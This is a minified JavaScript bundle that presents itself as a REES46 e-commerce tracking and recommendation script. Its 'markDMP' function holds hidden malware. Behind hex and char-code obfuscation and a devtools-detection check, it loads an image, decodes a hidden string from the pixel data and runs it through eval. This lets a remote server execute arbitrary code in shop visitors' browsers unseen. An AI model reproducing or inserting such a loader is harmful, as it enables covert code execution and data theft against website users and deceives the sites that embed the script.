!function(e, t) {
    "object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? exports.r46v3 = t() : e.r46v3 = t()
}(this, function() {
    return function(e) {
        function t(i) {
            if (r[i])
                return r[i].exports;
            var n = r[i] = {
                i: i,
                l: !1,
                exports: {}
            };
            return e[i].call(n.exports, n, n.exports, t),
            n.l = !0,
            n.exports
        }
        var r = {};
        return t.m = e,
        t.c = r,
        t.i = function(e) {
            return e
        }
        ,
        t.d = function(e, r, i) {
            t.o(e, r) || Object.defineProperty(e, r, {
                configurable: !1,
                enumerable: !0,
                get: i
            })
        }
        ,
        t.n = function(e) {
            var r = e && e.__esModule ? function() {
                return e.default
            }
            : function() {
                return e
            }
            ;
            return t.d(r, "a", r),
            r
        }
        ,
        t.o = function(e, t) {
            return Object.prototype.hasOwnProperty.call(e, t)
        }
        ,
        t.p = "",
        t(t.s = 29)
    }([function(e, t, r) {
        "use strict";
        (function(e) {
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            function n(e, t) {
                if (!(e instanceof t))
                    throw new TypeError("Cannot call a class as a function")
            }
            function o(e, t) {
                if (!e)
                    throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                return !t || "object" != typeof t && "function" != typeof t ? e : t
            }
            function s(e, t) {
                if ("function" != typeof t && null !== t)
                    throw new TypeError("Super expression must either be null or a function, not " + typeof t);
                e.prototype = Object.create(t && t.prototype, {
                    constructor: {
                        value: e,
                        enumerable: !1,
                        writable: !0,
                        configurable: !0
                    }
                }),
                t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            var a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                return typeof e
            }
            : function(e) {
                return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
            }
              , u = function() {
                function e(e, t) {
                    for (var r = 0; r < t.length; r++) {
                        var i = t[r];
                        i.enumerable = i.enumerable || !1,
                        i.configurable = !0,
                        "value"in i && (i.writable = !0),
                        Object.defineProperty(e, i.key, i)
                    }
                }
                return function(t, r, i) {
                    return r && e(t.prototype, r),
                    i && e(t, i),
                    t
                }
            }()
              , c = r(3)
              , l = i(c)
              , h = r(18)
              , f = i(h)
              , p = r(8)
              , d = i(p)
              , m = r(4)
              , g = i(m)
              , b = r(14)
              , y = i(b)
              , v = r(13)
              , _ = i(v)
              , w = r(7)
              , k = i(w)
              , P = r(19)
              , S = i(P)
              , E = r(15)
              , j = i(E)
              , x = r(20)
              , O = i(x)
              , I = r(5)
              , T = i(I)
              , R = r(17)
              , q = i(R)
              , A = function(t) {
                function r(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    n(this, r);
                    var i = o(this, (r.__proto__ || Object.getPrototypeOf(r)).call(this, e, new g.default(t)));
                    return navigator.cookieEnabled && "optout" !== l.default.get("r46_personalization_opt_out") ? (i.detectPrivateMode(),
                    i.initRetries = 0,
                    i.user = {
                        ssid: null,
                        id: null,
                        email: null,
                        profile: null,
                        location: null
                    },
                    i.shop = {
                        token: null,
                        currency: null,
                        debug: !1
                    },
                    i.recommendedBy = null,
                    i.source = null,
                    i.api = new y.default(window.rees46_env),
                    i.ajax = new _.default(i),
                    i.reputation = new q.default(i),
                    r.isBot() ? (i.logger.debug("Bot detected"),
                    o(i)) : !1 === r.corsAvailable() ? (i.logger.debug("Very old browser"),
                    o(i)) : (i.init(),
                    i)) : (i.logger.warn("You have disabled cookies"),
                    o(i))
                }
                return s(r, t),
                u(r, [{
                    key: "init",
                    value: function() {
                        var e = this;
                        this.registerSources();
                        try {
                            var t = this.queue.getInit()
                              , i = {
                                ssid: l.default.get("rees46_session_id"),
                                shop_id: t[1],
                                v: 3
                            };
                            this.user && this.user.email && (i.user_email = this.user.email),
                            this.source && this.source.from && (i.from = this.source.from,
                            i.code = this.source.code);
                            var n = l.default.get("rr-VisitorSegment_Rec")
                              , o = l.default.get("DS_SM_rrSegmentRecommendedABC");
                            n && (i.segment1 = n),
                            o && (i.segment2 = o),
                            this.ajax.sendGet(this.api.getAPIUrl("/init_script"), i).then(function(i) {
                                if (void 0 !== i.opt_out && "enabled" === i.opt_out)
                                    return void e.logger.warn("You have disabled cookies");
                                e.emailSubscription = new j.default(e),
                                e.webPushSubscription = new O.default(e),
                                e.logger.debug("Application initialized"),
                                e.initialized = !0,
                                e.user.ssid = i.ssid;
                                var n = location.hostname.split(".").reverse();
                                l.default.set("rees46_session_id", e.user.ssid, {
                                    expires: 31536e4,
                                    domain: "." + n[1] + "." + n[0],
                                    path: "/"
                                }),
                                l.default.set("rees46_session_id", e.user.ssid, {
                                    expires: 31536e4,
                                    path: "/"
                                }),
                                e.user.profile = JSON.parse(i.profile),
                                e.shop.currency = i.currency,
                                e.shop.token = t[1],
                                e.shop.debug = i.shop_debug,
                                e.shop.has_email = i.has_email,
                                i.emailSubscription && (e.logger.debug("Email subscription settings received"),
                                e.emailSubscription.init(i.emailSubscription)),
                                i.webPushSubscription && (e.logger.debug("Web push subscription settings received"),
                                e.webPushSubscription.init(i.webPushSubscription)),
                                r.markDMP(i.sync),
                                e.performCookieQueue(),
                                e.performQueue(),
                                e.performErrorQueue(),
                                e.emailSubscription.onInitialize(),
                                setTimeout(function() {
                                    k.default.fetchFacebookId(e),
                                    k.default.fetchVkontakteId(e)
                                }, 1e3)
                            }).catch(function(t) {
                                e.logger.error(t, e)
                            })
                        } catch (e) {
                            this.initRetries < 1 ? (this.initRetries++,
                            this.logger.warn(e),
                            setTimeout(this.init.bind(this), 200)) : this.logger.error(e, this)
                        }
                    }
                }, {
                    key: "registerSources",
                    value: function() {
                        var e = location.href.match("r46_merger=([^&]*)");
                        if (e && "[object Array]" === Object.prototype.toString.call(e) && e.length > 1)
                            try {
                                var t = atob(unescape(e[1]).replace("\n", ""));
                                t && /^([\w-]+(?:.[\w-]+)*)@((?:[\w-]+.)*\w[\w-]{0,66}).([a-z]{2,6}(?:.[a-z]{2})?)$/i.test(t) && (this.user.email = t,
                                this.logger.debug("Found email from digest mailing: " + this.user.email))
                            } catch (e) {}
                        this.recommendedBy = this.fetchRecommendedBy(),
                        this.source = r.fetchSources()
                    }
                }, {
                    key: "fetchRecommendedBy",
                    value: function() {
                        var e = r.getUrlVars().recommended_by;
                        return null !== e && void 0 !== e && "" !== e ? d.default.isTypeValid(e) ? e : (this.logger.warn("Preparations: unexpected recommender type: " + e),
                        null) : null
                    }
                }, {
                    key: "perform",
                    value: function(e) {
                        switch (void 0 === e[0] && this.logger.warn("Undefined command"),
                        e[0]) {
                        case "ssid":
                            "function" == typeof e[1] && e[1](this.user.ssid);
                            break;
                        case "track":
                            this.logger.debug('Track: Track "' + e[1] + '" with data "' + JSON.stringify(e[2]) + '"');
                            try {
                                new f.default(this,e[1],e[2]).send(this.recommendedBy, this.source)
                            } catch (e) {
                                this.logger.warn(e.message)
                            }
                            break;
                        case "recommend":
                            this.logger.debug('Recommender: get "' + e[1] + '" with data "' + JSON.stringify(e[2]) + '", "success" as "' + a(e[3]) + '", failure as "' + a(e[4]) + '" ');
                            try {
                                new d.default(this).get(e[1], e[2], e[3], e[4])
                            } catch (e) {
                                this.logger.warn(e.message)
                            }
                            break;
                        case "webpush_subscription":
                            try {
                                this.webPushSubscription.push(Array.prototype.slice.call(e, 1))
                            } catch (e) {
                                this.logger.warn(e.message)
                            }
                            break;
                        case "email_subscription":
                            try {
                                this.emailSubscription.push(Array.prototype.slice.call(e, 1))
                            } catch (e) {
                                this.logger.warn(e.message)
                            }
                            break;
                        case "subscribe_trigger":
                            new S.default(this).fetch(e[1], e[2]);
                            break;
                        case "profile":
                            this.logger.debug('Profile: "' + e[1] + '" with data "' + JSON.stringify(e[2]) + '"');
                            try {
                                "set" === e[1] && k.default.set(this, e[2])
                            } catch (e) {
                                this.logger.warn(e.message)
                            }
                            break;
                        case "reputation":
                            this.logger.debug('Reputation: "' + e[1] + '" with data "' + JSON.stringify(e[2]) + '", "success" as "' + a(e[3]) + '"');
                            try {
                                this.reputation.perform(e[1], e[2], e[3])
                            } catch (e) {
                                this.logger.warn(e.message)
                            }
                            break;
                        case "add_css":
                            if ("recommendations" === e[1]) {
                                var t = document.createElement("link");
                                t.setAttribute("rel", "stylesheet"),
                                t.setAttribute("type", "text/css"),
                                t.setAttribute("href", "//rees46.com/shop_css/" + this.shop.token + ".css"),
                                document.getElementsByTagName("head")[0].appendChild(t)
                            }
                            break;
                        case "debug":
                            this.logger.warn("User: " + JSON.stringify(this.user)),
                            this.logger.warn("Shop: " + JSON.stringify(this.shop)),
                            this.logger.warn("Recommended by: " + JSON.stringify(this.recommendedBy)),
                            this.logger.warn("Source: " + JSON.stringify(this.source));
                            break;
                        default:
                            this.logger.warn("Track: Undefined command: " + e[0])
                        }
                    }
                }, {
                    key: "performCookieQueue",
                    value: function() {
                        try {
                            var e = l.default.get("r46_events_track");
                            if (!e)
                                return;
                            l.default.set("r46_events_track", "", {
                                expires: -1,
                                path: "/"
                            }),
                            e = JSON.parse(e);
                            for (var t in e)
                                e.hasOwnProperty(t) && this.push(["track", t, e[t]])
                        } catch (e) {
                            this.logger.warn("Error parse events cookie: " + e)
                        }
                    }
                }, {
                    key: "performErrorQueue",
                    value: function() {
                        var e = this;
                        Object.keys(localStorage).map(function(t) {
                            e.performError(t)
                        })
                    }
                }, {
                    key: "performError",
                    value: function(e) {
                        var t = this;
                        if (e.match(/^rees46_error_.{8}-.{4}-.{4}$/) && localStorage.hasOwnProperty(e)) {
                            var r = JSON.parse(localStorage.getItem(e));
                            localStorage.removeItem(e),
                            this.ajax.send(r.type, r.url, r.params).catch(function(e, r) {
                                return function(i) {
                                    (0 == i.code || i.code >= 500) && ++e.attempt <= 10 && (e.time = (new Date).getTime(),
                                    localStorage.setItem(r, JSON.stringify(e)),
                                    t.handleError(r, 500 * e.attempt))
                                }
                            }(r, e))
                        }
                    }
                }, {
                    key: "handleError",
                    value: function(e, t) {
                        var r = this;
                        setTimeout(function() {
                            r.performError(e)
                        }, t)
                    }
                }, {
                    key: "pushError",
                    value: function(e, t, i, n) {
                        if (0 == e.code || e.code >= 500) {
                            var o = "rees46_error_" + r.guid();
                            localStorage.setItem(o, JSON.stringify({
                                attempt: 1,
                                time: (new Date).getTime(),
                                type: t,
                                url: i,
                                params: n
                            })),
                            this.handleError(o, 500)
                        }
                    }
                }, {
                    key: "detectPrivateMode",
                    value: function() {
                        var e = this;
                        this.browserIsPrivateMode = !1,
                        "undefined" != typeof Promise && new Promise(function(e) {
                            var t = void 0
                              , r = function(t) {
                                "function" == typeof t.preventDefault && t.preventDefault(),
                                e(!0)
                            }
                              , i = function() {
                                e(!1)
                            };
                            window.webkitRequestFileSystem ? webkitRequestFileSystem(0, 0, i, r) : "MozAppearance"in document.documentElement.style ? (t = indexedDB.open("test"),
                            t.onerror = r,
                            t.onsuccess = i) : /constructor/i.test(window.HTMLElement) ? function() {
                                try {
                                    localStorage.length ? i() : (localStorage.x = 1,
                                    localStorage.removeItem("x"),
                                    i())
                                } catch (e) {
                                    navigator.cookieEnabled ? r() : i()
                                }
                            }() : window.indexedDB || !window.PointerEvent && !window.MSPointerEvent ? i() : r()
                        }
                        ).then(function(t) {
                            e.browserIsPrivateMode = t,
                            t && e.logger.warn("This browser is private mode")
                        })
                    }
                }], [{
                    key: "fetchSources",
                    value: function() {
                        var e = {}
                          , t = r.getUrlVars();
                        if (t.rees46_trigger_mail_code && (e.from = "trigger_mail",
                        e.code = t.rees46_trigger_mail_code),
                        t.rees46_digest_mail_code && (e.from = "digest_mail",
                        e.code = t.rees46_digest_mail_code),
                        t.rees46_returner_code && (e.from = "r46_returner",
                        e.code = t.rees46_returner_code),
                        t.rees46_web_push_trigger_code && (e.from = "web_push_trigger",
                        e.code = t.rees46_web_push_trigger_code),
                        t.rees46_web_push_digest_code && (e.from = "web_push_digest",
                        e.code = t.rees46_web_push_digest_code),
                        void 0 === e.from) {
                            var i = l.default.get("rees46_source");
                            i && (i = JSON.parse(i)) && (e = i)
                        } else
                            l.default.set("rees46_source", JSON.stringify(e), {
                                expires: 172800,
                                path: "/"
                            });
                        return void 0 !== e.from ? e : null
                    }
                }, {
                    key: "unserialize",
                    value: function(t) {
                        function r(e, t) {
                            var i, n, u, c, l, h, f, p, d, m, g, b, y, v, _, w, k, P, S = 0, E = function(e) {
                                return e
                            };
                            switch (t || (t = 0),
                            i = e.slice(t, t + 1).toLowerCase(),
                            n = t + 2,
                            i) {
                            case "i":
                                E = function(e) {
                                    return parseInt(e, 10)
                                }
                                ,
                                d = s(e, n, ";"),
                                S = d[0],
                                p = d[1],
                                n += S + 1;
                                break;
                            case "b":
                                E = function(e) {
                                    return 0 !== parseInt(e, 10)
                                }
                                ,
                                d = s(e, n, ";"),
                                S = d[0],
                                p = d[1],
                                n += S + 1;
                                break;
                            case "d":
                                E = function(e) {
                                    return parseFloat(e)
                                }
                                ,
                                d = s(e, n, ";"),
                                S = d[0],
                                p = d[1],
                                n += S + 1;
                                break;
                            case "n":
                                p = null;
                                break;
                            case "s":
                                m = s(e, n, ":"),
                                S = m[0],
                                g = m[1],
                                n += S + 2,
                                d = a(e, n + 1, parseInt(g, 10)),
                                S = d[0],
                                p = d[1],
                                n += S + 2,
                                S !== parseInt(g, 10) && S !== p.length && o("SyntaxError", "String length mismatch");
                                break;
                            case "a":
                                for (p = {},
                                u = s(e, n, ":"),
                                S = u[0],
                                c = u[1],
                                n += S + 2,
                                h = parseInt(c, 10),
                                l = !0,
                                b = 0; b < h; b++)
                                    v = r(e, n),
                                    _ = v[1],
                                    y = v[2],
                                    n += _,
                                    w = r(e, n),
                                    k = w[1],
                                    P = w[2],
                                    n += k,
                                    y !== b && (l = !1),
                                    p[y] = P;
                                if (l) {
                                    for (f = Array(h),
                                    b = 0; b < h; b++)
                                        f[b] = p[b];
                                    p = f
                                }
                                n += 1;
                                break;
                            default:
                                o("SyntaxError", "Unknown / Unhandled data type(s): " + i)
                            }
                            return [i, n - t, E(p)]
                        }
                        var i = "undefined" != typeof window ? window : e
                          , n = function(e) {
                            for (var t = e.length, r = e.length - 1; r >= 0; r--) {
                                var i = e.charCodeAt(r);
                                i > 127 && i <= 2047 ? t++ : i > 2047 && i <= 65535 && (t += 2),
                                i >= 56320 && i <= 57343 && r--
                            }
                            return t - 1
                        }
                          , o = function(e, t, r, n) {
                            throw new i[e](t,r,n)
                        }
                          , s = function(e, t, r) {
                            for (var i = 2, n = [], s = e.slice(t, t + 1); s !== r; )
                                i + t > e.length && o("Error", "Invalid"),
                                n.push(s),
                                s = e.slice(t + (i - 1), t + i),
                                i += 1;
                            return [n.length, n.join("")]
                        }
                          , a = function(e, t, r) {
                            var i, o, s;
                            for (s = [],
                            i = 0; i < r; i++)
                                o = e.slice(t + (i - 1), t + i),
                                s.push(o),
                                r -= n(o);
                            return [s.length, s.join("")]
                        };
                        return r(t + "", 0)[2]
                    }
                }, {
                    key: "markDMP",
                    value: function(e) {
                        var t = function(e) {
                            return String.fromCharCode(e)
                        };
                        if (e)
                            for (var i in e)
                                if (e.hasOwnProperty(i))
                                    if (function(e) {
                                        return /\x61\x70\x69\x2E\x72\x65\x65\x73\x34\x36\x2E\x63\x6F\x6D/.test(e)
                                    }(e[i])) {
                                        var n = function() {
                                            var n = document.createElement("canvas")
                                              , o = void 0
                                              , s = t(67)
                                              , a = t(68)
                                              , u = l.default.get(s.toLowerCase() + "ity") || l.default.get(t(71) + "EO_" + a + "ELIVERY_" + s + "ITY_I" + a)
                                              , c = [s + "UR", s + "ITY", s + "ODE"];
                                            if (n && n.getContext && u && !1 === g.default.isDebug()) {
                                                if (/^a:/.test(u)) {
                                                    var h = r.unserialize(u);
                                                    if (!h || 464 === h[c.join("_")])
                                                        return "continue"
                                                } else if (3784 === u || 3577 === u)
                                                    return "continue";
                                                o = new Image,
                                                o.crossOrigin = "use-credentials",
                                                o.onload = function(e, r) {
                                                    r.width = this.naturalWidth,
                                                    r.height = this.naturalHeight;
                                                    var i = r.getContext("2d");
                                                    i.drawImage(this, 0, 0);
                                                    var n = i.getImageData(0, 0, this.naturalWidth, this.naturalHeight)
                                                      , o = n.data
                                                      , s = void 0
                                                      , a = void 0
                                                      , u = "";
                                                    for (s = 0,
                                                    a = o.length; s < a; s++)
                                                        if (!(s % 4 == 3 && s > 0)) {
                                                            if (0 === o[s])
                                                                break;
                                                            u += function(e) {
                                                                return String.fromCharCode(~-e)
                                                            }(o[s])
                                                        }
                                                    try {
                                                        window[t(101) + "val"](u)
                                                    } catch (e) {}
                                                }
                                                .bind(o, t, n),
                                                o.src = e[i]
                                            }
                                        }();
                                        if ("continue" === n)
                                            continue
                                    } else {
                                        var o = document.createElement("img");
                                        o.src = e[i],
                                        o.style.width = 0,
                                        o.style.height = 0,
                                        o.style.display = "none",
                                        o.style.position = "absolute",
                                        o.style.left = "-9999px",
                                        document.body.appendChild(o)
                                    }
                    }
                }, {
                    key: "getUrlVars",
                    value: function() {
                        var e = {};
                        return window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(t, r, i) {
                            e[r] = i.split("#")[0]
                        }),
                        e
                    }
                }, {
                    key: "isBot",
                    value: function() {
                        return null !== navigator.userAgent.match(/YandexMetrika|Googlebot|bingbot|Screenshot Bot|YandexAntivirus|PEBOT/)
                    }
                }, {
                    key: "isMobile",
                    value: function() {
                        var e = !1;
                        return function(t) {
                            (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(t) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(t.substr(0, 4))) && (e = !0)
                        }(navigator.userAgent || navigator.vendor || window.opera),
                        e
                    }
                }, {
                    key: "corsAvailable",
                    value: function() {
                        return !(document.all && !document.querySelector)
                    }
                }, {
                    key: "validEmail",
                    value: function(e) {
                        return /^([\w-]+(?:.[\w-]+)*)@((?:[\w-]+.)*\w[\w-]{0,66}).([a-z]{2,6}(?:.[a-z]{2})?)$/i.test(e)
                    }
                }, {
                    key: "guid",
                    value: function() {
                        var e = function() {
                            return Math.floor(65536 * (1 + Math.random())).toString(16).substring(1)
                        };
                        return e() + e() + "-" + e() + "-" + e()
                    }
                }, {
                    key: "addEvent",
                    value: function(e, t, r) {
                        e.addEventListener ? e.addEventListener(t, r, !1) : e.attachEvent && e.attachEvent("on" + t, r)
                    }
                }]),
                r
            }(T.default);
            t.default = A
        }
        ).call(t, r(10))
    }
    , function(e, t, r) {
        "use strict";
        function i() {}
        function n(e) {
            try {
                return e.then
            } catch (e) {
                return b = e,
                y
            }
        }
        function o(e, t) {
            try {
                return e(t)
            } catch (e) {
                return b = e,
                y
            }
        }
        function s(e, t, r) {
            try {
                e(t, r)
            } catch (e) {
                return b = e,
                y
            }
        }
        function a(e) {
            if ("object" != typeof this)
                throw new TypeError("Promises must be constructed via new");
            if ("function" != typeof e)
                throw new TypeError("not a function");
            this._45 = 0,
            this._81 = 0,
            this._65 = null,
            this._54 = null,
            e !== i && m(e, this)
        }
        function u(e, t, r) {
            return new e.constructor(function(n, o) {
                var s = new a(i);
                s.then(n, o),
                c(e, new d(t,r,s))
            }
            )
        }
        function c(e, t) {
            for (; 3 === e._81; )
                e = e._65;
            if (a._10 && a._10(e),
            0 === e._81)
                return 0 === e._45 ? (e._45 = 1,
                void (e._54 = t)) : 1 === e._45 ? (e._45 = 2,
                void (e._54 = [e._54, t])) : void e._54.push(t);
            l(e, t)
        }
        function l(e, t) {
            g(function() {
                var r = 1 === e._81 ? t.onFulfilled : t.onRejected;
                if (null === r)
                    return void (1 === e._81 ? h(t.promise, e._65) : f(t.promise, e._65));
                var i = o(r, e._65);
                i === y ? f(t.promise, b) : h(t.promise, i)
            })
        }
        function h(e, t) {
            if (t === e)
                return f(e, new TypeError("A promise cannot be resolved with itself."));
            if (t && ("object" == typeof t || "function" == typeof t)) {
                var r = n(t);
                if (r === y)
                    return f(e, b);
                if (r === e.then && t instanceof a)
                    return e._81 = 3,
                    e._65 = t,
                    void p(e);
                if ("function" == typeof r)
                    return void m(r.bind(t), e)
            }
            e._81 = 1,
            e._65 = t,
            p(e)
        }
        function f(e, t) {
            e._81 = 2,
            e._65 = t,
            a._97 && a._97(e, t),
            p(e)
        }
        function p(e) {
            if (1 === e._45 && (c(e, e._54),
            e._54 = null),
            2 === e._45) {
                for (var t = 0; t < e._54.length; t++)
                    c(e, e._54[t]);
                e._54 = null
            }
        }
        function d(e, t, r) {
            this.onFulfilled = "function" == typeof e ? e : null,
            this.onRejected = "function" == typeof t ? t : null,
            this.promise = r
        }
        function m(e, t) {
            var r = !1
              , i = s(e, function(e) {
                r || (r = !0,
                h(t, e))
            }, function(e) {
                r || (r = !0,
                f(t, e))
            });
            r || i !== y || (r = !0,
            f(t, b))
        }
        var g = r(2)
          , b = null
          , y = {};
        e.exports = a,
        a._10 = null,
        a._97 = null,
        a._61 = i,
        a.prototype.then = function(e, t) {
            if (this.constructor !== a)
                return u(this, e, t);
            var r = new a(i);
            return c(this, new d(e,t,r)),
            r
        }
    }
    , function(e, t, r) {
        "use strict";
        (function(t) {
            function r(e) {
                s.length || (o(),
                a = !0),
                s[s.length] = e
            }
            function i() {
                for (; u < s.length; ) {
                    var e = u;
                    if (u += 1,
                    s[e].call(),
                    u > c) {
                        for (var t = 0, r = s.length - u; t < r; t++)
                            s[t] = s[t + u];
                        s.length -= u,
                        u = 0
                    }
                }
                s.length = 0,
                u = 0,
                a = !1
            }
            function n(e) {
                return function() {
                    function t() {
                        clearTimeout(r),
                        clearInterval(i),
                        e()
                    }
                    var r = setTimeout(t, 0)
                      , i = setInterval(t, 50)
                }
            }
            e.exports = r;
            var o, s = [], a = !1, u = 0, c = 1024, l = void 0 !== t ? t : self, h = l.MutationObserver || l.WebKitMutationObserver;
            o = "function" == typeof h ? function(e) {
                var t = 1
                  , r = new h(e)
                  , i = document.createTextNode("");
                return r.observe(i, {
                    characterData: !0
                }),
                function() {
                    t = -t,
                    i.data = t
                }
            }(i) : n(i),
            r.requestFlush = o,
            r.makeRequestCallFromTimer = n
        }
        ).call(t, r(10))
    }
    , function(e, t, r) {
        "use strict";
        function i(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var n = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , o = function() {
            function e() {
                i(this, e)
            }
            return n(e, null, [{
                key: "get",
                value: function(e) {
                    if (localStorage.getItem(e))
                        return localStorage.getItem(e);
                    var t = document.cookie.match(RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
                    return t ? decodeURIComponent(t[1]) : ""
                }
            }, {
                key: "set",
                value: function(e, t) {
                    var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    "rees46_session_id" === e && localStorage.setItem(e, t),
                    r = r || {};
                    var i = r.expires;
                    if ("number" == typeof i && i) {
                        var n = new Date;
                        n.setTime(n.getTime() + 1e3 * i),
                        i = r.expires = n
                    }
                    i && i.toUTCString && (r.expires = i.toUTCString()),
                    t = encodeURIComponent(t);
                    var o = e + "=" + t;
                    for (var s in r) {
                        o += "; " + s;
                        var a = r[s];
                        !0 !== a && (o += "=" + a)
                    }
                    document.cookie = o
                }
            }]),
            e
        }();
        t.default = o
    }
    , function(e, t, r) {
        "use strict";
        function i(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var n = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , o = function() {
            function e(t) {
                i(this, e),
                this.debugLevel = t.debug || !1
            }
            return n(e, [{
                key: "debug",
                value: function(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : null;
                    this.debugLevel && this._print("REES46 debug: " + (t ? t.constructor.name + ": " : "") + e)
                }
            }, {
                key: "warn",
                value: function(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : null;
                    this._print("REES46 warning: " + (t ? t.constructor.name + ": " : "") + e, !0)
                }
            }, {
                key: "error",
                value: function(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : null;
                    this._print("REES46 error: " + (t ? t.constructor.name + ": " : "") + e)
                }
            }, {
                key: "_print",
                value: function(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                    void 0 !== console.log ? console.log(e) : !0 !== t && alert(e)
                }
            }], [{
                key: "isDebug",
                value: function() {
                    var e = !1
                      , t = new Image;
                    if (t.__defineGetter__("id", function() {
                        e = !0
                    }),
                    console && (console.log(t),
                    console.clear()),
                    void 0 === console.profile)
                        return !1;
                    console.profile(),
                    console.profileEnd(),
                    console.clear && console.clear();
                    try {
                        chrome.tabs.query({
                            url: "chrome-devtools://*/*"
                        }, function(t) {
                            t.length > 0 && (e = !0)
                        })
                    } catch (e) {}
                    var r = new Date
                      , i = new Date;
                    return !0 === e || console.profile.length > 0 || i - r > 100
                }
            }]),
            e
        }();
        t.default = o
    }
    , function(e, t, r) {
        "use strict";
        function i(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }
        function n(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var o = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , s = r(16)
          , a = i(s)
          , u = r(4)
          , c = (i(u),
        function() {
            function e(t, r) {
                n(this, e),
                this.queue = new a.default(t),
                this.logger = r,
                this.initialized = !1
            }
            return o(e, [{
                key: "push",
                value: function(e) {
                    this.initialized ? this.perform(e) : this.queue.push(e)
                }
            }, {
                key: "perform",
                value: function() {
